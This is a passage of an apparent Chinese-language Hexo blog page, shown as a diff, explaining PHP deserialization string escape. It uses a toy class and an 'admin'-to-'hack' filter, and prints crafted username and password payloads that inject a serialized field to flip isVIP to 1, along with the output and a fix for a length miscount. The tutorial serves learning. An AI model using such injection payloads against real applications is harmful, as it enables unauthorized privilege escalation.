class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>结果为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p> 仔细观察这一串字符串可以看到紫色方框内一共107个字符，但是前面只有显示105 </p>
+<p> <img src="https://image.3001.net/images/20210824/1629789872_61249eb06d3f49c802d31.png" alt="img"> </p>
+<p><strong>造成这种现象的原因是</strong>：替换之前我们目标子串的位置是<strong>123456</strong>，一共<strong>6</strong>个字符，替换之后我们的目标子串显然超过<strong>10</strong>个字符，所以会造成计算得到的payload不准确</p>
+<p><strong>解决办法是</strong>：多添加<strong>2</strong>个<strong>admin</strong>，这样就可以补上缺少的字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">public $username;</span><br><span class="line">public $password;</span><br><span class="line">public $isVIP;</span><br><span class="line"></span><br><span class="line">public function __construct($u,$p)&#123;</span><br><span class="line">$this-&gt;username = $u;</span><br><span class="line">$this-&gt;password = $p;</span><br><span class="line">$this-&gt;isVIP = 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function filter($s)&#123;</span><br><span class="line">return str_replace(&quot;admin&quot;,&quot;hack&quot;,$s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class="line">$a_seri = serialize($a);</span><br><span class="line">$a_seri_filter = filter($a_seri);</span><br><span class="line"></span><br><span class="line">echo $a_seri_filter;</span><br><span class="line">?&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>结果为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://image.3001.net/images/20210824/1629789872_61249eb0ac0a40a44c51a.png" alt="img"> </p>
+<p>验证一下</p>
+<p><img src="https://tvax2.sinaimg.cn/large/006nKnK0ly1h3h4e6hqv6j31qp10g4ci.jpg" alt="1655688862893"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/06/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-md/" data-id="cl4peviq000047stu49kp4id3" data-title="php反序列化字符串逃逸;.md" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/06/22/EZPOP-Revenge-md/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          EZPOP_Revenge.md
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/06/22/%5BMRCTF2020%5DEzpop_Revenge/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/06/22/EZPOP-Revenge-md/">EZPOP_Revenge.md</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-md/">php反序列化字符串逃逸;.md</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/22/%5BMRCTF2020%5DEzpop_Revenge/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/22/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
